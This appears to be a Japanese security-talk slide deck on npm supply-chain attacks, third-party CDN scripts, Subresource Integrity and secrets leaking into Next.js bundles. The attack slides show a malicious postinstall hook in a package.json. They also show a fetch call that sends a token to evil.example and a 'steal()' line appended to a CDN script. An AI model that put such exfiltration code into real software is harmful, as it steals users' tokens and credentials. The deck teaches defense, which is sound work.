---
layout: section
routeAlias: dependencies
style: "--accent: var(--cyan)"
---

<div class="section-num">03</div>

# 自分が書いていないコード

<div class="section-sub">依存パッケージを選び、更新するのは自分の責任</div>

---
routeAlias: dependencies-powers
---

# 依存パッケージが攻撃できる2つの瞬間 <span class="badge" style="--c: var(--red)">攻撃</span>

<div class="sub">パッケージは、あなたのコードのバグを必要としない。インストールするだけで十分</div>

<div class="cols moments">
<div class="card">
<div class="col-h ng"><lucide-terminal /> インストール時：あなたのマシンとCI</div>

```json
// リリース4.4.2のsome-lib/package.json
"scripts": { "postinstall": "node collect.js" }
```

1. **攻撃者が4.4.2を公開する**：乗っ取ったアカウントで
2. **次の更新で取り込まれる**：`^4.4.1`は4.4.2を受け入れる
3. <span class="here">**npm installがそれを実行する**：あなたの権限で</span>

<div class="loot"><b>盗むもの</b>：npmとGitHubのトークン、envやconfigのクラウドキー</div>

</div>
<div class="card">
<div class="col-h ng"><lucide-globe /> 実行時：ブラウザとあなたのサーバー</div>

```js
// some-lib@4.4.2のどこかで
fetch('https://evil.example/?t=' + token)
```

- **自分のJSにバンドルされる**：だからCSPの`'self'`でも許可される
- **importしただけで動く**：呼び出し不要
- <span class="here">**すべてのユーザーで動く**：そしてサーバーでも</span>

<div class="loot"><b>盗むもの</b>：ブラウザではセッション、トークン、入力内容。サーバーでは<code>process.env</code></div>

</div>
</div>

<div class="note text-center"><span class="ng">⚠</span> 被害が起きる箇所 · npmはデフォルトでインストールスクリプトを実行する。pnpm 10以降は許可した場合のみ</div>

<style>
.moments { align-items: stretch; }
.moments ol { padding-left: 1.2rem; }
.moments .loot { margin-top: 0.5rem; font-size: 0.7rem; font-weight: 600; color: var(--comment); }
.moments .loot + ul { margin-top: 0.1rem; }
</style>

<div class="punch">依存パッケージはどれも、インストール時にも本番でも、あなたの権限で動く</div>

<div class="source"><lucide-link /><a href="https://docs.npmjs.com/cli/v11/using-npm/config#ignore-scripts" target="_blank">npm：ignore-scripts（デフォルトfalse）</a> · <a href="https://pnpm.io/supply-chain-security" target="_blank">pnpm：サプライチェーンセキュリティ</a></div>

---

# 意図を持って更新する <span class="badge" style="--c: var(--green)">防御</span>

<div class="sub">セキュリティ修正は速く、それ以外は慎重に</div>

- **ロックファイルからインストールする**：CIはあなたがレビューした正確なバージョンを使う
- **新しいバージョンは少し待つ**：乗っ取られたリリースを誰かが見つける時間を作る
- **セキュリティ勧告はすぐに適用する**：セキュリティ修正では、遅らせること自体がリスク
- **依存を減らせば、入口も減る**：まずメンテナーとインストールスクリプトを確認する

<div class="pm-table">

| | ロックファイルのみでインストール | 新バージョンを待つ |
|---|---|---|
| pnpm | `pnpm install --frozen-lockfile`、CIではデフォルトで有効 | `minimumReleaseAge`、1日（pnpm 11以降はデフォルトで有効） |
| Bun | `bun ci`、CIでは自動ではない | `install.minimumReleaseAge`、秒単位、デフォルトは無効 |
| npm | `npm ci` | `min-release-age`、日単位 |

</div>

<style>
.pm-table table { font-size: 0.8rem; margin-top: 0.6rem; }
.pm-table th, .pm-table td { padding: 0.25rem 0.6rem !important; }
.pm-table td:first-child { font-weight: bold; }
</style>

<div class="punch">自分で選んでいないバージョンが、勝手に本番へ届いてはいけない</div>

<div class="source"><lucide-link /><a href="https://pnpm.io/cli/install" target="_blank">pnpm：install</a> · <a href="https://pnpm.io/supply-chain-security" target="_blank">pnpm：minimumReleaseAge</a> · <a href="https://bun.com/docs/pm/cli/install" target="_blank">Bun：install</a> · <a href="https://bun.com/docs/runtime/bunfig" target="_blank">Bun：bunfig</a> · <a href="https://docs.npmjs.com/cli/v11/using-npm/config#min-release-age" target="_blank">npm：min-release-age</a></div>

---

# サードパーティのスクリプトはいつでも変わりうる <span class="badge" style="--c: var(--red)">攻撃</span>

<div class="sub">別ドメインから読み込むチャットウィジェットや分析タグは、あなたのオリジンで動く</div>

```html
<script src="https://cdn.example/chat.js"></script>
```

- **配信元はいつでもファイルを変えられる**：新しい所有者や攻撃者が悪意あるコードに差し替える
- **固定して検証する（SRI）**：`integrity`にレビュー済みファイルのハッシュを入れる。1バイトでも変われば拒否される
- **または自分でホストする**：そうすればファイルは、あなたがデプロイしたときだけ変わる
- **固定できない場合は？** タグマネージャーは設計上変わる：数を絞り、`script-src`でそのドメインだけを許可する

<div class="punch">別ドメインの<code>&lt;script src&gt;</code>は、そのドメインにあなたのオリジンを明け渡す</div>

<div class="source"><lucide-link /><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity" target="_blank">MDN：Subresource Integrity</a></div>

---

# 再現：CDNのファイルが変わる <span class="badge" style="--c: var(--red)">デモ</span>

<div class="sub">あなたは<code>chat.js</code>をレビューして追加した。後日、CDNを握る者が1行追記する</div>

<div class="cols">
<div>

<div class="small-code">

```js
// 今日のCDN上のchat.js
document.getElementById('chat').textContent = 'Chat: online'
steal() // ← 追記された：トークンをevil.exampleへ送る
```

</div>

<div class="col-h ng"><lucide-x /> integrityなし</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

```html
<script src="…/chat.js" crossorigin="anonymous"
  integrity="sha256-U2lZ…P2+E8="></script>
```

<div class="col-h ok"><lucide-check /> レビュー済みファイルに固定</div>

<div class="devtools">
<div class="dt-h">DevTools → Console</div>
<div class="dt-row ok">Failed to find a valid digest in the 'integrity' attribute for resource '…/chat.js' … The resource has been blocked.</div>
</div>

</div>
</div>

<div class="note">別ドメインのファイルでは、SRIに<code>crossorigin</code>も必要：ブラウザがハッシュ対象のバイトを読めるようにするため</div>

<div class="pills"><DemoLink href="demos/cdn.html">integrityなし</DemoLink><DemoLink href="demos/cdn-pinned.html">固定あり</DemoLink></div>

<div class="foot"><lucide-flask-conical /> デモページはダミーのトークンを<b>evil.example</b>（名前解決されない予約ドメイン）に送る。ブラウザの外には何も出ない</div>

---

# バンドルの中身はすべて公開される <span class="badge" style="--c: var(--red)">漏えい</span>

<div class="sub">攻撃ではない：自分で、すべての訪問者に配ってしまう</div>

<div class="cols">
<div>

```bash
# .env
NEXT_PUBLIC_MAPS_KEY=AIza…  # → ブラウザのJSへ
PAYMENT_SECRET=sk_live_…    # サーバーのみ
```

```js
// next buildがこれを…
initMap(process.env.NEXT_PUBLIC_MAPS_KEY)
// …誰でもダウンロードできるファイルの中で、こうする
initMap("AIza…")
```

</div>
<div>

- **NEXT_PUBLIC_は公開を意味する**：秘密情報を置かない
- **クライアントコードでundefined？** それはNext.jsがサーバー用の値を外に出さないため：そのコードをサーバーへ移す
- **ブラウザ向けのキーは制限する**：提供元で許可ドメインとクォータを設定する
- **本番ではソースマップを出さない**：元のソースをそのまま配ってしまう

</div>
</div>

<div class="foot"><lucide-search /> サイトを調べる：DevTools → Sources → すべてのファイルから、キー名や<b>sk_live</b>のような接頭辞を検索する</div>

<div class="bridge">どれも仮の話ではない → <b>実際に起きた</b></div>

<div class="source"><lucide-link /><a href="https://nextjs.org/docs/app/guides/environment-variables#bundling-environment-variables-for-the-browser" target="_blank">Next.js：環境変数</a> · <a href="https://nextjs.org/docs/app/api-reference/config/next-config-js/productionBrowserSourceMaps" target="_blank">Next.js：productionBrowserSourceMaps</a></div>

<style>
.cols li { font-size: 0.9rem; line-height: 1.5; }
.foot { margin-top: 0.5rem; }
.bridge { margin-top: 0.8rem; padding-top: 0.5rem; }
</style>
